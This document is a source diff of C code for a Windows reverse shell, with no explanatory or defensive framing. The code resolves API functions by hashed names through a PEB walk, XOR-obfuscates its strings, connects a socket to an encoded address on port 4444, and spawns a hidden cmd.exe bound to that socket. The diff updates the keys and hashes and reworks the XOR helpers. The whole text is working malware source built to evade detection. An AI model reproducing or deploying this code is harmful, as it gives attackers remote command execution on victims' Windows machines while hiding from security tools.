@@ -1,20 +1,18 @@
 #include "structs.h"
 #include <stdio.h>
-#include <inttypes.h>
 
 /*---------------------------------------------------------------------------------------------------------------------------------------------------------------*/
 
-#define KEY1 0x7c
-#define KEY2 0x69
-#define KEY3 0x73
+#define KEY1 0xec
+#define KEY2 0x3c
+#define KEY3 0x41
 
-#define SEED                181
-#define LOADLIBRARYA_H      2179633274
-#define CREATEPROCESSA_H    3279178822
-#define WSASTARTUP_H        3399804530
-#define WSASOCKETA_H        4086672762
-#define INET_ADDR_H         1423830552
-#define CONNECT_H           4003214732
+#define SEED                157
+#define LOADLIBRARYA_H      1420784546
+#define CREATEPROCESSA_H    628741118
+#define WSASTARTUP_H        2083302682
+#define WSASOCKETA_H        3358964994
+#define CONNECT_H           1611305140
 
 #define LOSELOSE_HASH(s, hash) do {                   \
     (hash) = 0;                                       \
@@ -26,32 +24,34 @@
     }                                                 \
 } while (0)
 
-#define MEMSET(buf, val, len)   for (int i = 0; i < (len); i++) ((char*)(buf))[i] = (val)
-#define LEN(s)                  ({ const char *_p = (s); while (*_p) _p++; _p - (s); })
+#ifndef ARRAYSIZE
+#define ARRAYSIZE(a)            (sizeof(a)/sizeof((a)[0]))
+#endif
+
+#define XOR_ARR(buf, key)       xor_bytes((buf), ARRAYSIZE(buf), (key))
 #define HTONS(x)                ( ( (( (USHORT)(x) ) >> 8 ) & 0xff) | ((( (USHORT)(x) ) & 0xff) << 8) )
+#define MEMSET(buf, val, len)   for (int i = 0; i < (len); i++) ((char*)(buf))[i] = (val)
 
 /*---------------------------------------------------------------------------------------------------------------------------------------------------------------*/
 
 typedef HMODULE (WINAPI* LOADLIBRARYA)(LPCSTR);
-typedef BOOL (WINAPI* CREATEPROCESSA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID , LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
 typedef int (WINAPI* WSASTARTUP)(WORD, LPWSADATA);
 typedef SOCKET (WINAPI* WSASOCKETA)(int, int, int, WSAPROTOCOL_INFOA*, DWORD, DWORD);
-typedef unsigned long (WINAPI* INET_ADDR)(const char*);
 typedef int (WINAPI* CONNECT)(SOCKET, struct sockaddr*, int);
+typedef BOOL (WINAPI* CREATEPROCESSA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID , LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
 
 /*---------------------------------------------------------------------------------------------------------------------------------------------------------------*/
 
-static inline unsigned char _xor(unsigned char x, unsigned char y) {
-    return (x | y) & ~(x & y);  // equivalent to x ^ y
+static inline  __attribute__((always_inline)) unsigned char xor8(unsigned char x, unsigned char y) {
+ 	return (x | y) & ~(x & y);  // equivalent to x ^ y 
 }
 
-static void xor_buf(char* buf, unsigned char key) {
-    for (size_t i = 0; i < LEN(buf); i++) {
-        buf[i] = _xor(buf[i], key);
-    }
+static inline  __attribute__((always_inline)) void xor_bytes(unsigned char *buf, size_t n, unsigned char key) {
+    for (size_t i = 0; i < n; ++i)
+		buf[i] = xor8(buf[i], key);
 }
 
-// Get Function Address via PEB Walk
+// Get function address via PEB Walk
 static HMODULE GetProcAddressPEB(DWORD64 qwFuncHash) {    
 	PIMAGE_EXPORT_DIRECTORY pImgExportDir;
 	DWORD dwFunctionNumber, dwHash;    
@@ -87,27 +87,28 @@ static HMODULE GetProcAddressPEB(DWORD64 qwFuncHash) {
 	return NULL;
 }
 
-void rev() {
+void Main() {
     
-	int port = 8180 ;
-	char ip[] = {0x42,0x41,0x44,0x5d,0x43,0x5d,0x43,0x5d,0x42, 0x73};
+	int port = 4444 ;
+
+	//char ip[] = {0xb5,0xbd,0xb6,0xaa,0xb5,0xb2,0xbc,0xaa,0xb6,0xaa,0xbc, 0x84};
+	unsigned char ip[] = {0x43, 0x3c, 0x3c, 0x3d, 0x3c};
 	
 	//   ws2_32.dll    0x77  0x73  0x32  0x5f  0x33  0x32  0x2e  0x64  0x6c  0x6c  key
-	char ws2_32_dll[] = {0x0b, 0x0f, 0x4e, 0x23, 0x4f, 0x4e, 0x52, 0x18, 0x10, 0x10, 0x7c};
+	char ws2_32_dll[] = {0x9b, 0x9f, 0xde, 0xb3, 0xdf, 0xde, 0xc2, 0x88, 0x80, 0x80, 0xec};
 
-	// powershell 0x70, 0x6f, 0x77, 0x65, 0x72, 0x73, 0x68, 0x65, 0x6c, 0x6c,  key
 	//	 cmd	  0x63, 0xcd, 0x64, key
-	char cmd[] = {0x0a, 0x04, 0x0d, 0x69};
-	
+	char cmd[] = {0x22, 0x2c, 0x25, 0x41};
+	// powershell 0x70, 0x6f, 0x77, 0x65, 0x72, 0x73, 0x68, 0x65, 0x6c, 0x6c,  key
+
 	// get function addresses
-	UINT64 pLoadLibraryA = (UINT64)GetProcAddressPEB(LOADLIBRARYA_H);	 
-	UINT64 pCreateProcessA = (UINT64)GetProcAddressPEB(CREATEPROCESSA_H);   
-	xor_buf(ws2_32_dll, KEY1);
+	UINT64 pLoadLibraryA = (UINT64)GetProcAddressPEB(LOADLIBRARYA_H);
+	UINT64 pCreateProcessA = (UINT64)GetProcAddressPEB(CREATEPROCESSA_H); 	   
+	XOR_ARR(ws2_32_dll, KEY1);
 	((LOADLIBRARYA)pLoadLibraryA)(ws2_32_dll);
 	UINT64 pWSAStartup = (UINT64)GetProcAddressPEB(WSASTARTUP_H);
 	UINT64 pWSASocketA = (UINT64)GetProcAddressPEB(WSASOCKETA_H);
-	UINT64 pinet_addr = (UINT64)GetProcAddressPEB(INET_ADDR_H);
-	UINT64 pconnect = (UINT64)GetProcAddressPEB(CONNECT_H);
+	UINT64 pConnect = (UINT64)GetProcAddressPEB(CONNECT_H);
 
 	// winsock struct declarations
 	WSADATA wsadata; 
@@ -115,21 +116,32 @@ void rev() {
 	PROCESS_INFORMATION pi;
 	SOCKADDR_IN sa;
 	
-	((WSASTARTUP)pWSAStartup)(MAKEWORD(2, 2), &wsadata); // required before using winsock
-	SOCKET socket = ((WSASOCKETA)pWSASocketA)(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); // create the socket
+	// initiate  winsock
+	((WSASTARTUP)pWSAStartup)(MAKEWORD(2, 2), &wsadata); 
+
+	// create the socket
+	SOCKET socket = ((WSASOCKETA)pWSASocketA)(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); 
 	sa.sin_family = AF_INET;
 	sa.sin_port = HTONS(port);
-	xor_buf(ip, KEY3);
-	sa.sin_addr.s_addr = ((INET_ADDR)pinet_addr)(ip); // set sa fields
-	((CONNECT)pconnect)(socket, &sa, sizeof(sa)); // perform the connection
+	XOR_ARR(ip, KEY2);
+	sa.sin_addr.S_un.S_un_b.s_b1 = ip[0]; 
+	sa.sin_addr.S_un.S_un_b.s_b2 = ip[1]; 
+	sa.sin_addr.S_un.S_un_b.s_b3 = ip[2]; 
+	sa.sin_addr.S_un.S_un_b.s_b4 = ip[3]; 
+
+	// perform the connection
+	((CONNECT)pConnect)(socket, (struct sockaddr*)&sa, sizeof(sa)); 
+
+	// fill in StartupInfo
 	size_t siLen = sizeof(si);
-	MEMSET(&si, 0 ,siLen); // fill in si (prep for CreateProcessA)
+	MEMSET(&si, 0 ,siLen); 
 	si.cb = siLen;
 	si.dwFlags = (STARTF_USESTDHANDLES);
 	si.hStdInput = (HANDLE)socket;
 	si.hStdOutput = (HANDLE)socket;
 	si.hStdError = (HANDLE)socket;
-	xor_buf(cmd, KEY2);
-	((CREATEPROCESSA)pCreateProcessA)(NULL, (LPSTR)cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, (LPSTARTUPINFOA)&si, &pi); // launch shell bound for socket
-    
+	
+	// launch shell bound for socket
+	XOR_ARR(cmd, KEY3);
+	((CREATEPROCESSA)pCreateProcessA)(NULL, (LPSTR)cmd, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, (LPSTARTUPINFOA)&si, &pi); 
 }
